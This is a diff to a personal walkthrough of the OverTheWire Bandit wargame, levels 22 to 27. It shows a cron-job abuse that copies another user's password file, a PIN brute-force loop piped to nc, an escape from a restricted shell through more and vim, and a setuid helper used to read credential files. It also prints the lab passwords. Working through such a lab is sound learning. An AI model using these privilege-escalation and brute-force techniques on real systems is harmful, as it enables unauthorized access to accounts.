@@ -695,18 +695,239 @@ mytarget=$(echo I am user bandit22 | md5sum | cut -d ' ' -f 1)
 ```
 
 ```bash
-bandit22@bandit:~$ mytarget=$(echo I am user bandit22 | md5sum | cut -d ' ' -f 1)
-bandit22@bandit:~$ $mytarget
--bash: 8169b67bd894ddbb4412f91573b38db3: command not found
+bandit22@bandit:~$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
 bandit22@bandit:~$ cat /tmp/$mytarget
-Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 
 **Password for Level 23**
 
 ```
-Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 
 ## [Level 23 - > Level 24](https://overthewire.org/wargames/bandit/bandit24.html)
+
+```
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+```
+
+```bash
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+My updates:
+
+* we have to pretend we are `bandit24`, because there is no `bandit23` directory in `/var/spool/`
+
+```bash
+myname="bandit24"
+
+cd /var/spool/$myname
+pwd
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+Where I get stuck is in modifying the script to execute commands in the `var/spool/bandit24` directory. I get an error message stating that `.*` can't be executed, meaning that the bash script is not able to see all the contents in the directory, or else the `.*` would have expanded to all the files in the directory. I'm guessing this occurs because I do not have read access to the directory, but I do have write and execute access to it.
+
+```bash
+bandit23@bandit:~$ /tmp/beto/test.sh
+/var/spool/bandit24
+Executing and deleting all scripts in /var/spool/bandit24:
+Handling *
+stat: cannot stat './*': No such file or directory
+Handling .*
+stat: cannot stat './.*': No such file or directory
+```
+
+After seeing the beginning of a tutorial, I understand what needs to be done. We do not need to recreate the script. We need to send a copy of a bash script we want to execute in the `/var/spool/bandit24` directory to copy the password of `bandit24` to the directory we want.
+
+```bash
+cp /etc/bandit_pass/bandit24 /tmp/beto/bandit24
+chmod 777 /tmp/beto/bandit24
+```
+
+Also make sure to `chmod 777` both `/tmp/beto/` and `test.sh` so `bandit24` can execute the file given to it and has write permission for the temp directory you are working in.
+
+```bash
+bandit23@bandit:/tmp/beto$ cat bandit24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+## [Level 24 -> Level 25](https://overthewire.org/wargames/bandit/bandit25.html)
+
+I plan on using a previous Bash loop I made as a template for this exercise. First I looked up how to make a loop of numbers with leading zeros. Thanks [StackOverflow](https://stackoverflow.com/questions/18460123/how-to-add-leading-zeros-for-for-loop-in-shell)!
+
+```
+for i in {0000..9999}; do echo "$i"; done
+```
+
+Naive solution:
+
+```bash
+for i in {0000..9999}; do
+  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002
+done > /tmp/beto/results
+```
+
+The problem with the solution above is that it re-establishes the connection to the daemon each time I try a new password. However the daemon does not exit when the wrong password is given. So the program above will hang on the first code. Therefore, it's better to generate the input before connecting to the server, then piping it to the daemon all at once:
+
+```bash
+for i in {0000..9999}; do
+  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc localhost 30002 # > /tmp/beto/results
+```
+
+Result:
+
+```bash
+...
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+```
+
+## [Level 25 -> Level 26](https://overthewire.org/wargames/bandit/bandit26.html)
+
+Initially, my thoughts are to do the exact same thing as I did with the startup script that would log me out. (Level 18 -> Level 19)
+
+```bash
+ssh -i 26/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org -t "/bin/sh"
+```
+
+```powershell
+PS C:\Users\_\Documents\GitHub\wargames\Bandit> ssh -i 26/bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org -t "/bin/sh"
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+ |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
+Connection to bandit.labs.overthewire.org closed.
+```
+
+As expected, this is not helping me out.
+
+The `.dot` files look pretty normal:
+
+```bash
+bandit25@bandit:~$ ls -al /home/bandit26/
+total 36
+drwxr-xr-x  3 root     root     4096 May  7  2020 .
+drwxr-xr-x 41 root     root     4096 May  7  2020 ..
+-rwsr-x---  1 bandit27 bandit26 7296 May  7  2020 bandit27-do
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+drwxr-xr-x  2 root     root     4096 May  7  2020 .ssh
+-rw-r-----  1 bandit26 bandit26  258 May  7  2020 text.txt
+bandit25@bandit:~$ diff .bashrc /home/bandit26/.bashrc
+bandit25@bandit:~$ diff .profile /home/bandit26/.profile
+bandit25@bandit:~$ diff .bash_logout /home/bandit26/.bash_logout
+bandit25@bandit:~$
+```
+
+Nothing abnormal in `.ssh` directory either. 
+
+Dumb idea, I could lookup the text for that mysterious `bandit26` keyart.
+
+```
+grep -rnw '/' -e $(cat art.txt) --no-messages
+```
+
+```
+Binary file /proc/config.gz matches
+```
+
+I don't think grepping that phrase will help me out. 
+
+So lets find out how to find which shell the user is using. After googling this, it appears to be stored in the `/etc/passwd` file.
+
+>The **/etc/passwd** file stores essential  information, which required during login. In other words, it stores user account information. The /etc/passwd is a plain text file. It contains a list of the system’s accounts, giving for each account some useful  information like user ID, group ID, home directory, shell, and more. The /etc/passwd file should have general read permission as many command  utilities use it to map user IDs to user names. However, write access to the /etc/passwd must only limit for the superuser/root account. 
+
+* [article on `/etc/passwd`](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)
+
+```bash
+bandit25@bandit:~$ cat /etc/passwd | grep -F "bandit26"
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+
+So it basically opens up the `text.txt` file before immediately closing. I'm guessing this `text.txt` file is the ASCII art.
+
+Had to look up the solution to this. So basically, `more` uses a version of `vim` to display text to the screen. `vim` has a feature if you press `v` where you can execute commands within vim using the `:e command`. `more` will only enter this `vim` mode if the shell screen is small enough. Therefore you have to reduce the shell screen to a small height because the ASCII art is small. Then you can run a command to retrieve the password. I would have never guessed that on my own lol.
+
+**Password for Bandit26**
+
+```
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
+
+## Level 26 -> Level 27
+
+But in order to make `bandit26` usable, you still need to change the shell. So here are the steps to do that:
+
+1. Decrease screen for `more` interface to appear
+2. Hit `v` to enter `vim` mode (you can expand screen now)
+3. In `vim` editor mode, type `:set shell=/bin/bash`
+4. Type in `:shell` to exit `vim`
+
+Once in, you have to grab the next bandit password for `bandit27` using a command that acts as a `bandit27` user, like in previous exercises:
+
+```bash
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+```
+
+Overall I wish there were more hints for this exercise. Because you had to know ahead of time that `more` had a `vim` feature, and that `vim` has execution features within the editor, and that you can access `vim` if the `more` interface is fully utilized. However it was entertaining to learn how to approach this problem, and demonstrates how seemingly simple commands can have unexpected vulnerabilities if you look carefully through them.
+
+Going forward, I don't mind looking up solutions as long as I:
+
+1. understand what is going on in the solution 
+2. enjoy seeing the process of watching a person's approach to tackling a task
+
+## [Level 27 -> Level 28](https://overthewire.org/wargames/bandit/bandit28.html)
 
